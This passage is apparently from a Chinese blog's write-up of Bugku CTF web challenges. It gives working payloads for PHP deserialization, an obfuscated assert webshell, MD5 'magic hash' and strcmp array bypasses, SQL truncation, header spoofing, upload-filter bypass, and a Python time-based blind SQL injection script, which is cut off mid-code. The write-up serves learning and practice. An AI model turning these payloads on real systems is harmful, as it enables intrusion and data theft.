class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">array</span>(<span class="string">'a'</span>=&gt;<span class="string">'apple'</span>,<span class="string">'b'</span>=&gt;<span class="string">'banana'</span>,<span class="string">'c'</span>=&gt;<span class="number">40</span>);</span><br><span class="line">$s = serialize($a);</span><br><span class="line"><span class="keyword">echo</span> $s;</span><br><span class="line">$b = unserialize($s);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">print_r($b);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/59.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>大概清楚规律了，再看本题，要给参数password赋值一个被序列化的字符串，使password成为Flag类的参数file</p><p>有点难理解，再看一个例子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $file;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> Flag;</span><br><span class="line">$a -&gt; file = <span class="string">'flag.php'</span>;</span><br><span class="line">$a = serialize($a);</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这个例子初始化了一个Flag对象a，并赋值’flag.php’，在进行序列化，得到的值就相当于我们给password赋值一个反序列化的Flag对象</p><p>结果：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/60.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>综上，我们GET参数?txt=php://input&amp;file=hint.php&amp;password=O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;}</p><p>POST数据welcome to the bugkuctf</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/61.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>成功拿到flag</p><p>附上本题参考链接：<a href="https://www.cnblogs.com/Pinging/p/8278168.html" target="_blank" rel="noopener">https://www.cnblogs.com/Pinging/p/8278168.html</a></p><h3 id="过狗一句话"><a href="#过狗一句话" class="headerlink" title="过狗一句话"></a>过狗一句话</h3><p>网址：<a href="http://120.24.86.145:8010/" target="_blank" rel="noopener">http://120.24.86.145:8010/</a></p><p>题目给出了提示代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$poc=<span class="string">"a#s#s#e#r#t"</span>; </span><br><span class="line">$poc_1=explode(<span class="string">"#"</span>,$poc);</span><br><span class="line">$poc_2=$poc_1[<span class="number">0</span>].$poc_1[<span class="number">1</span>].$poc_1[<span class="number">2</span>].$poc_1[<span class="number">3</span>].$poc_1[<span class="number">4</span>].$poc_1[<span class="number">5</span>]; </span><br><span class="line">$poc_2($_GET[<span class="string">'s'</span>]);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>用assert语句执行任意命令</p><p>输入?s=print_r(scandir(‘./‘))</p><p>扫描当前目前下所有文件</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/62.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>访问<a href="http://120.24.86.145:8010/f94lag.txt" target="_blank" rel="noopener">http://120.24.86.145:8010/f94lag.txt</a> </p><p><img src="/img/Bugkuctf-Web/63.png" alt=""></p><p>获得flag</p><h3 id="字符？正则？"><a href="#字符？正则？" class="headerlink" title="字符？正则？"></a>字符？正则？</h3><p>网址：<a href="http://120.24.86.145:8002/web10/" target="_blank" rel="noopener">http://120.24.86.145:8002/web10/</a></p><p>代码审计题，代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">highlight_file(<span class="string">'2.php'</span>);</span><br><span class="line">$key=<span class="string">'KEY&#123;********************************&#125;'</span>;</span><br><span class="line">$IM= preg_match(<span class="string">"/key.*key.&#123;4,7&#125;key:\/.\/(.*key)[a-z][[:punct:]]/i"</span>, trim($_GET[<span class="string">"id"</span>]), $match);</span><br><span class="line"><span class="keyword">if</span>( $IM )&#123; </span><br><span class="line">  <span class="keyword">die</span>(<span class="string">'key is: '</span>.$key);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>匹配正则输出flag值</p><p>[:punct:]指任意标点符号</p><p>输入?id=keykeykkkkkey:/k/keyk.</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/64.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>获得flag</p><h3 id="前女友-SKCTF"><a href="#前女友-SKCTF" class="headerlink" title="前女友(SKCTF)"></a>前女友(SKCTF)</h3><p>网址：<a href="http://118.89.219.210:49162/" target="_blank" rel="noopener">http://118.89.219.210:49162/</a></p><p>页面源代码给了提示链接</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/65.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>链接是一个code.txt文件，里面给出了提示代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'v1'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'v2'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'v3'</span>]))&#123;</span><br><span class="line">    $v1 = $_GET[<span class="string">'v1'</span>];</span><br><span class="line">    $v2 = $_GET[<span class="string">'v2'</span>];</span><br><span class="line">    $v3 = $_GET[<span class="string">'v3'</span>];</span><br><span class="line">    <span class="keyword">if</span>($v1 != $v2 &amp;&amp; md5($v1) == md5($v2))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!strcmp($v3, $flag))&#123;</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>审计代码，熟悉的值不等，md5值相等，240610708和QNKCDZO</p><p>还要绕过strcmp，我们知道strcmp比较两个字符串相等时返回0，否则返回大于0或者小于0，我们要输出flag，必须让strcmp返回0，但是strcmp不能处理数组，会返回NULL</p><p>所以输入：?v1=240610708&amp;v2=QNKCDZO&amp;v3[]</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/66.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>拿到flag</p><h3 id="login1-SKCTF"><a href="#login1-SKCTF" class="headerlink" title="login1(SKCTF)"></a>login1(SKCTF)</h3><p>网址：<a href="http://118.89.219.210:49163/" target="_blank" rel="noopener">http://118.89.219.210:49163/</a></p><p>一个登陆系统，包含了登陆界面和注册界面，注册用户后登陆发现要管理员账号才能看到flag</p><p>尝试了万能密码等等都不行，猜测是用了mysql_real_escape函数过滤用户输入，怎么办呢，题目给了提示，sql约束攻击，攻击原理我写在了另一篇文章里，这里就直接给出解题过程</p><p>猜测管理员账号是admin，因为注册admin账号，提示admin账号已经存在</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/67.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>注册账号admin          1，(尽量多一点空格)密码自行设置</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/68.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>注册成功来到登录界面，输入账号admin,密码是自行设置的那个密码</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/69.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>拿到flag，不行的话注册admin后面的空格再延长一点应该就可以了</p><h3 id="你从哪里来"><a href="#你从哪里来" class="headerlink" title="你从哪里来"></a>你从哪里来</h3><p>网址：<a href="http://120.24.86.145:9009/from.php" target="_blank" rel="noopener">http://120.24.86.145:9009/from.php</a></p><p>什么都没有提示，源代码也只有一句话，are you from google</p><p>猜测要从google访问到该页面才能拿到flag</p><p>想起来http请求头的Referer字段值就代表从哪个页面访问到该页面</p><p>尝试一下，用burp抓包，在请求头位置添加一行Referer: <a href="https://www.google.com" target="_blank" rel="noopener">https://www.google.com</a></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/70.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>果然，拿到了flag</p><h3 id="md5-collision-NUPT-CTF"><a href="#md5-collision-NUPT-CTF" class="headerlink" title="md5 collision(NUPT_CTF)"></a>md5 collision(NUPT_CTF)</h3><p>网址：<a href="http://120.24.86.145:9009/md5.php" target="_blank" rel="noopener">http://120.24.86.145:9009/md5.php</a></p><p>md5碰撞，源代码应该是这样的：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    $md51 = md5(<span class="string">'QNKCDZO'</span>);</span><br><span class="line">$a = @$_GET[<span class="string">'a'</span>];</span><br><span class="line">$md52 = @md5($a);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($a))&#123;</span><br><span class="line">        <span class="keyword">if</span>($a != <span class="string">'QNKCDZO'</span> &amp;&amp; $md51 == $md52)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"nctf&#123;***&#125;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"false!!!"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"please input a"</span>;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>php在比较0e开头的字符串时会将其视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0</p><p>附上md5加密后以0e开头的字符串</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line">0e830400451993494058024219903391</span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line"></span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line"></span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line"></span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br></pre></td></tr></table></figure><p>输入?a=s878926199a</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/71.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>得到flag</p><h3 id="程序员本地网站"><a href="#程序员本地网站" class="headerlink" title="程序员本地网站"></a>程序员本地网站</h3><p>网址：<a href="http://120.24.86.145:8002/localhost/" target="_blank" rel="noopener">http://120.24.86.145:8002/localhost/</a></p><p>题目给出提示要我们从本地访问，用burp抓包添加Referer:<a href="http://127.0.0.1，失败" target="_blank" rel="noopener">http://127.0.0.1，失败</a></p><p>想起头部还有一个字段X-Forwarded-For，代表了来源ip地址，添加X-Forwarded-For:127.0.0.1</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/72.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>获得flag</p><h3 id="各种绕过"><a href="#各种绕过" class="headerlink" title="各种绕过"></a>各种绕过</h3><p>网址：<a href="http://120.24.86.145:8002/web7/" target="_blank" rel="noopener">http://120.24.86.145:8002/web7/</a></p><p>一道代码审计题</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">highlight_file(<span class="string">'flag.php'</span>); </span><br><span class="line">$_GET[<span class="string">'id'</span>] = urldecode($_GET[<span class="string">'id'</span>]); </span><br><span class="line">$flag = <span class="string">'flag&#123;xxxxxxxxxxxxxxxxxx&#125;'</span>; </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'uname'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_POST[<span class="string">'passwd'</span>])) &#123; </span><br><span class="line">    <span class="keyword">if</span> ($_GET[<span class="string">'uname'</span>] == $_POST[<span class="string">'passwd'</span>]) </span><br><span class="line"></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'passwd can not be uname.'</span>; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (sha1($_GET[<span class="string">'uname'</span>]) === sha1($_POST[<span class="string">'passwd'</span>])&amp;($_GET[<span class="string">'id'</span>]==<span class="string">'margin'</span>)) </span><br><span class="line"></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag); </span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line"></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'sorry!'</span>; </span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要求我们POST请求提交变量passwd和GET请求提交变量id和变量uname</p><p>变量uname和passwd不能相等但是两者sha1加密后完全相等，我们md5和sha1处理数组会返回NULL，且NULL===NULL，id的话让它等于’margin’就行，url解码还是原来的</p><p>附上payload</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/73.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>拿到flag</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/74.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h3><p>网址：<a href="http://120.24.86.145:8002/web8/" target="_blank" rel="noopener">http://120.24.86.145:8002/web8/</a></p><p>代码审计题</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">extract($_GET);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($ac))</span><br><span class="line">&#123;</span><br><span class="line">$f = trim(file_get_contents($fn));</span><br><span class="line"><span class="keyword">if</span> ($ac === $f)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;This is flag:"</span> .<span class="string">" $flag&lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;sorry!&lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>extract函数作用是将数组里的键名取出作为新的变量名，键名对应的键值赋值给响应的变量值</p><p>也就是说我们GET的参数ac和fn的值就是变量ac和变量fn的值，题目要求变量ac和变量f完全相等，变量f是变量fn经过file_get_contents得到的值，我们可以利用php://input，让file_get_contents读取字节流</p><p>payloads如下</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/75.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/76.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>拿到flag</p><h3 id="细心"><a href="#细心" class="headerlink" title="细心"></a>细心</h3><p>网址：<a href="http://120.24.86.145:8002/web13/" target="_blank" rel="noopener">http://120.24.86.145:8002/web13/</a></p><p>看到提示：想办法变成admin，大概是要以管理员身份访问之类的</p><p>页面伪造了404页面，两个链接也没有什么提示作用，尝试一下访问robots.txt</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/77.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>发现文件resusl.php</p><p>访问</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/78.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>发现下面有提示了一行代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ($_GET[x]==$password)</span><br></pre></td></tr></table></figure><p>大概要我们GET一个参数x，要等于变量password的值，想起来刚开始的提示变成admin，就试了一下GET?x=admin</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/79.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>拿到了flag</p><h3 id="求getshell"><a href="#求getshell" class="headerlink" title="求getshell"></a>求getshell</h3><p>网址：<a href="http://120.24.86.145:8002/web9/" target="_blank" rel="noopener">http://120.24.86.145:8002/web9/</a></p><p>需要我们上传一个图片文件，上传php文件提示</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/80.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>用burp抓包修改文件类型为图片类型，依然上传失败</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/81.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>猜测是对文件名和文件类型都有检查，想了很久不知道怎么做</p><p>看了别人的题解，发现要对Content-Type: multipart/form-data修改为Content-Type: Multipart/form-data</p><p>绕过过滤，再将文件名修改为php5(php的别名)，只有这个没有被过滤，再将文件类型修改为图片类型</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/82.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>具体为什么要这么做，找了好多文章都没有解释原因，暂时当成一个技巧记下来吧</p><h3 id="INSERT-INTO注入"><a href="#INSERT-INTO注入" class="headerlink" title="INSERT INTO注入"></a>INSERT INTO注入</h3><p>网址：<a href="http://120.24.86.145:8002/web15/" target="_blank" rel="noopener">http://120.24.86.145:8002/web15/</a></p><p>给出了源码提示：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getIp</span><span class="params">()</span></span>&#123;</span><br><span class="line">$ip = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>]))&#123;</span><br><span class="line">$ip = $_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$ip = $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line">&#125;</span><br><span class="line">$ip_arr = explode(<span class="string">','</span>, $ip);</span><br><span class="line"><span class="keyword">return</span> $ip_arr[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$host=<span class="string">"localhost"</span>;</span><br><span class="line">$user=<span class="string">""</span>;</span><br><span class="line">$pass=<span class="string">""</span>;</span><br><span class="line">$db=<span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">$connect = mysql_connect($host, $user, $pass) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to connect"</span>);</span><br><span class="line"></span><br><span class="line">mysql_select_db($db) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to select database"</span>);</span><br><span class="line"></span><br><span class="line">$ip = getIp();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'your ip is :'</span>.$ip;</span><br><span class="line">$sql=<span class="string">"insert into client_ip (ip) values ('$ip')"</span>;</span><br><span class="line">mysql_query($sql);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>过滤了逗号，并且是insert 注入</p><p>我们先来看一下insert注入方法，没有报错，没有查询，只能延时注入</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/83.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>有延迟，可以延时注入</p><p>可是过滤了逗号，就没办法用if语句了</p><p>但是还有一种判断执行语句：select case when 判断条件 then 执行语句1 else 执行语句2 end</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/84.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>ok，成功延时，那么最后考虑注入的判断条件，正常来说是用substr函数一位一位的截取判断，但是我们之前实用的substr函数也都是需要用到逗号的，怎么办呢</p><p>get了另外一种substr函数的使用方法：substr(database() from 1 for 1) = substr(database(),1,1)</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/85.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>接下来只需要写个脚本注入就可以了</p><p>先注出数据库名：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://120.24.86.145:8002/web15/'</span></span><br><span class="line">allString = <span class="string">'''1234567890~`!@#$%^&amp;*()-_=+[]&#123;&#125;;:'"|\,&lt;.&gt;/?qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'''</span></span><br><span class="line">database = <span class="string">''</span></span><br><span class="line">flag = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> allString:</span><br><span class="line">        header = &#123;</span><br><span class="line">            <span class="string">"X-Forwarded-For"</span>:<span class="string">"1'+(select case when (ascii(substr(database() from %d for 1))=%d) then sleep(3) else 0 end))#"</span>%(i,ord(j))</span><br><span class="line">            &#125;</span><br><span class="line">        r = requests.get(url,headers=header)</span><br><span class="line">        t = r.elapsed.total_seconds()</span><br><span class="line">        print(<span class="string">'the time of '</span>+j+<span class="string">' is '</span>+str(t))</span><br><span class="line">        <span class="keyword">if</span> t &gt;= <span class="number">3</span>:</span><br><span class="line">            database = database + j</span><br><span class="line">            print(<span class="string">'the '</span>+str(i)+<span class="string">' place of database is '</span>+j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> t &lt; <span class="number">3</span> <span class="keyword">and</span> j == <span class="string">'M'</span>:</span><br><span class="line">            flag = <span class="number">0</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> flag == <span class="number">0</span> :</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">print(<span class="string">'database:'</span>,database)</span><br></pre></td></tr></table></figure><p>结果：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/86.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>数据名为web15</p><p>注表名：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://120.24.86.145:8002/web15/'</span></span><br><span class="line">allString = <span class="string">'''1234567890~`!@#$%^&amp;*()-_=+[]&#123;&#125;;:'"|\,&lt;.&gt;/?qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'''</span></span><br><span class="line">table_name = <span class="string">''</span></span><br><span class="line">flag = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> allString:</span><br><span class="line">        header = &#123;</span><br><span class="line">            <span class="string">"X-Forwarded-For"</span>:<span class="string">"1'+(select case when (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()) from %d for 1))=%d) then sleep(3) else 0 end))#"</span>%(i,ord(j))</span><br><span class="line">            &#125;</span><br><span 